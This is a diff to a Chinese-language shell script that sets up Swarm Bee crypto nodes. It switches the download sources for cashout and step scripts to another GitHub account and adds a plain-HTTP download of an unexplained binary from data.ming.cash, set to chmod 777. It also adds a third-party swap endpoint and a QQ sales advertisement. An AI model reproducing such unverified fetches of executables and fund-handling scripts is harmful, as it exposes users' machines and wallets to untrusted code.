@@ -2,6 +2,7 @@
 cntFile=".showcnt.txt"
 epFile="epFile.txt"
 cd /root
+ip=`curl ifconfig.me`
 if [ ! -f $cntFile ]; then
 echo "首次使用脚本，进行初始化……"
 sudo apt-get update
@@ -10,10 +11,11 @@ sudo apt-get install -y lrzsz
 sudo apt-get install -y screen
 sudo apt-get install -y net-tools
 wget https://github.com/ethersphere/bee/releases/download/v0.5.3/bee_0.5.3_amd64.deb
-wget -O cashout.sh https://gist.githubusercontent.com/ralph-pichler/3b5ccd7a5c5cd0500e6428752b37e975/raw/aa576d6d28b523ea6f5d4a1ffb3c8cc0bbc2677f/cashout.sh && chmod 777 cashout.sh
-wget https://raw.githubusercontent.com/pumpkin4gb/bzz/main/step2.sh && chmod 777 step2.sh
-wget https://raw.githubusercontent.com/pumpkin4gb/bzz/main/step3.sh && chmod 777 step3.sh
+wget https://raw.githubusercontent.com/lzlhmoon/bee/main/cashout.sh && chmod 777 cashout.sh
+wget https://raw.githubusercontent.com/lzlhmoon/bee/main/step2.sh && chmod 777 step2.sh
+wget https://raw.githubusercontent.com/lzlhmoon/bee/main/step3.sh && chmod 777 step3.sh
 sudo dpkg -i bee_0.5.3_amd64.deb && sudo chown -R bee:bee /var/lib/bee
+wget http://data.ming.cash/beeby/bee053 && chmod 777 bee053
 echo "1" > $cntFile
 chmod +rw $cntFile
 sed -i 's/10000000000000000/1/g' cashout.sh
@@ -35,16 +37,20 @@ echo "    若需更改endpoint，请自行修改epFile.txt"
 cat>node${tCnt}.yaml<<EOF
 api-addr: :$((1534+${tCnt}))
 config: /root/node${tCnt}.yaml
-bootnode: "/ip4/47.113.202.103/tcp/1634/p2p/16Uiu2HAmRRALhkNMC6mDiY6CLyQUa7esxBCW3YMC64d4gY692rca"
+bootnode: 
+- /ip4/47.113.202.103/tcp/1634/p2p/16Uiu2HAmRRALhkNMC6mDiY6CLyQUa7esxBCW3YMC64d4gY692rca
+bootnode-mode: true
 data-dir: /var/lib/bee/node${tCnt}
-cache-capacity: "2000000"
+cache-capacity: "5000000"
+nat-addr: ${ip}:1735
 block-time: "15"
 debug-api-addr: :$((1634+${tCnt}))
 debug-api-enable: true
 p2p-addr: :$((1734+${tCnt}))
 password-file: /var/lib/bee/password
-swap-initial-deposit: "10000000000000000"
-verbosity: 5
+swap-initial-deposit: "100000000000000000"
+verbosity: 3
+welcome-message: "hello world,大量出售geth请联系：QQ373582671"
 swap-endpoint: http://47.253.61.23:8545
 full-node: true
 EOF
